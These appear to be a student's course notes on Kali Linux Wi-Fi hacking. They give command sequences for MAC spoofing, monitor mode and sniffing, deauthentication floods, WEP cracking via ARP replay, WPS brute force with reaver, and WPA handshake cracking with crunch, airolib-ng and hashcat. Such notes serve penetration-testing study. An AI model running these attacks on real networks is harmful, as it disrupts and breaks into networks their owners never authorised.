**Basic Setup and LINUX BASIC COMMANDS:**
<pre>
install link for kalilinux - https://zsecurity.org/download-custom-kali/
unzip it
Go to vm ware, file -open -this unzipped file
check settings 
run 

pwd
ls    ls -l
cd   cd ..
man ls (or )man cd  ls --help -> helps in detail
tab -> auto complete
apt-get    -> donwload or install progs (or) apps
apt-get update
apt-get install app_name -y
<b>NEEDED APPS:</b>    (apt-get install terminator)
terminator  - spliting option in terminal
<b>WEBSITES:</b>
explainshell.com
</pre>

**PRE CONNECTION SETUP KNOWLEDGE**
<pre>
<b>wireless adapter with props:</b> 
* monitor mode
* packet injection
* AP mode
* Recommended brand: Atheros AR9271, Realtek RTL8812AU

before connecting network interface
     ifconfig
     eth0 and lo
after connecting to machine
     iwconfig
     eth0 lo and wlan0

<b>MAC</b>-media access control     (network device address )    which will be same in all computers
permanent, physical, unique    (assigned by manufacturer to network interafces like wifi, wifi card,wifi adapters,wired)
contains source mac and destination mac
change MAC address to become anonymous    
Uses: Bypass filter, anonymity

<b>Network Interfaces</b>
network interface – any device allowing us to connect to a network
inside eth0 or wlan0 or lo ether ____________  is mac address in managed mode, ether is not shown and unspec is shown in monitor mode(first 12 digits without in monitor mode
ifconfig -> show all interfaces
iwconfig → show all wireless network interfaces

<b>Change MAC address</b>
     ifconfig wlan0 down    (for disabling before the change process) 
     ifconfig wlan0 hw ether 00:11:22:33:44:55     (after restart get resetted)
     ifconfig wlan0 up 
device1 MAC accept data only If the device2 have its destination MAC as  device1   
default mode for network devices is managed mode   (captures packets only from destination mac address )
Eg:source mac address: 00:11:22:3
     destination mac address : 00:55:34:56
can do monitor using monitor mode    (captures packets from any destination address almost all)
     iwconfig wlan0 down 
     iwconfig wlan0 mode monitor 
     iwconfig wlan0 up 
attacks don't need any internet connection
</pre>


**PACKET SNIFFING**
<pre>
<b>aircrack-ng</b>
     airodump-ng mon0      → shows the packets
most of the wifi adapter only communicates with 2.5ghz frequency

ESSID      name
BSSID      mac_address
PwR    signal strength
#/s      data collected per second
CH     works on channel
MB    maximum speed
ENC   encryption mode
AUTH   authentication used
     airodump-ng  --band a mon0            shows 5G networks tooo
     airodump-ng  -- bssid  11:21:G6:14   - -channel  2  - - write  filename   mon0 
     ctr C     ( to stop)


<b>Deauthentication </b>
To pretend as client having its mac address
To pretend like router having its mac address and disconnecting all networks
**airplay-ng**
>airplay-ng  --deauth  100000000 -a target_router_mac_address  -c client_mac_address  mon0   (mac_address info is taken from airodump-ng)
>ctr  C    to stop
</pre>

**Wifi Hacking (WEP/WPA/WPA2)** 
<pre>
<b>WEP CRACKING</b>
The client encrypts the data with a unique key and sends in air to the router
This router decrypts the data using same key.
Initial vector + passsword =  keystream
keystream + “this is the message”  →  cnu3dhubd   (encoded)
router always have the key but not Initial vector(IV)
IV is only 24bits so it repeats it again and again without creating unique key

Methods
airodump-ng   to capture all packets/IVs
aircrack-ng      to analyze the IVs and crack the key 
     airodump-ng  --bssid  target_mac  --channel  2  --write  filename   mon0    <
filename.cap is the file <br>
     aircrack-ng filename.cap 
prompts key found!  23:42:23:A2
put the password in wifi as 234223A2  done

<b>Fakeauth attack</b>
a for accknowledge must do before all attacks
     aireplay-ng - -fakeauth 0 -a target_mac -h my_mac

<b>Arp request reply attack</b>
if the router or wifi is not having more data passed, it can't be cracked,so need to inject more packages with aireplay 
     aireplay-ng - -fakeauth 0 -a target_mac -h my_mac        (ACK for telling we are connecting to the netw interface ) 
     airodump-ng  - - bssid  target_mac  - -channel  2  - - write  file_name  mon0 
     aireplay-ng  - -arpreplay -b target_mac -h my_mac mon0        check data value in info 
     aircrack-ng filename.cap 
or 

Korek ChopChop Attack   (refer somewhere) 
or
Fragmentation Attack (refer somewhere) 

<b>WPA AND WPA2 CRACKING</b>

wpa and wpa2 have the wps push button enabled or disable which is useful in cracking.
This wps feature can be found by
     wash  - - interface mon0
Lck   tells locked or not
it may fail if the target router has PBC(push button auth) or wps disabled

     reaver - -bssid  target_mac - -channel 1 - -interface mon0 -vvv - -no-associate 
paralleley add the down cmd 
     aireplay-ng - -fakeauth 0 -a target_mac -h my_mac 

when PBC(push button auth) or wps disabled, use the following method 
     airplay-ng  - -deauth  4 -a target_router_mac_address  -c client_mac_address  mon0   (use –deauth 4 so that client don't identify they are disconnected)
</pre>

**Create word list:**
<pre>
<b>crunch</b>
     crunch 6 8 abctd123$@ -o pass.txt
6 min combinations
8 max combinations
abctd123$@ combinations to use 

     aircrack-ng handshake.cap  -w pass.txt
done :)

<b>Pairwise Master Key</b> from word list (faster than previous)
     airolib-ng test-db  - -import password pass.txt
create a text file with essid 
     airolib-ng test-db  - -import essid essid.txt
     airolib-ng test-db –batch
- done :)

     aircrack-ng -r test-db handshake.cap  
done :)

<b>Hashcat</b> (use GPU - fastest cracking ) in windows      
download converted file of .cap to .hccapx and add it in hashcat dir
add pass.txt in hashcat dir
     hashcat64.exe -I          shows cpu and gpu info 
     hashcat64.exe -m 2500 -d 1 handshake.hcapx pass.txt 
m - wpa/wpa2 hash 
d -  which device to use
</pre>

